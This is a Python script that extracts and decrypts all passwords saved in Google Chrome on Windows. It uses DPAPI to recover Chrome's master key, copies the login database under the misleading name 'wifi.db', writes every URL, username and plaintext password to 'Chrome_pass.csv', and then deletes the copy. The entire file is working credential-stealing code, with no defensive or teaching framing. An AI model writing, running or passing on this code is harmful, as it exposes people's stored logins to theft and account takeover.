from Crypto.Cipher import AES
import win32crypt
import sqlite3
import base64
import shutil
import json
import os

wifi_db = 'wifi.db'
path_local = r'AppData\Local\Google\Chrome\User Data\Local State'
path_login = r'AppData\Local\Google\Chrome\User Data\default\Login Data'

def getPassword():
    with open(os.environ['userprofile'] + os.sep + path_local, 'r', encoding='utf-8') as get_path:
        local = get_path.read()
        local = json.loads(local)
    key_master = base64.b64decode(local['os_crypt']["encrypted_key"])
    key_master = key_master[5:]
    key_master = win32crypt.CryptUnprotectData(key_master, None, None, None, 0)[1]
    return key_master

def decryptPayload(secret, payload):
    return secret.decrypt(payload)

def onSecret(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decryptPassword(buff, key_master):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        secret = onSecret(key_master, iv)
        decrypted_passwd = decryptPayload(secret, payload)
        decrypted_passwd = decrypted_passwd[:-16].decode()
        return decrypted_passwd
    except Exception as err:
        return f'1: {err}'

if __name__ == '__main__':
    key_master = getPassword()
    login_db = os.environ['USERPROFILE'] + os.sep + path_login
    shutil.copy2(login_db, wifi_db)
    connect = sqlite3.connect(wifi_db)
    cursor = connect.cursor()

    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
    for item in cursor.fetchall():
        url = item[0]
        username = item[1]
        encrypted_password = item[2]
        decrypted_password = decryptPassword(encrypted_password, key_master)
        save = "URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n\n"
        with open('Chrome_pass.csv', 'a') as passwords:
            passwords.write(save)
        passwords.close()

    cursor.close()
    connect.close()
    try:
        os.remove(wifi_db)
    except Exception as err_db:
        print(err_db)